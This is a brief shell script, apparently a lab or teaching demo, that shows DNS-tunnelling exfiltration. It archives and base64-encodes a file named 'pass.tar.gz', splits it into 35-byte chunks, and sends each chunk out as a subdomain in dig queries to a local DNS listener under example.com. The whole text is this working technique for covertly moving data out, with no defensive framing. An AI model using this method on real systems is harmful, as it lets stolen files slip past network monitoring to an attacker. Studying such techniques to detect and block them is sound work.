# Making the understanding easy
python3 create-file-to-exfil.py
tar -czf pass.tar.gz an-ip-file.txt
base64 -i pass.tar.gz > encoded
split -b 35 encoded xaa
for i in $(ls xaa*);do DATA=$(base64 -i $i | tr -d "="); dig -p 10053 @localhost $DATA.example.com +short; done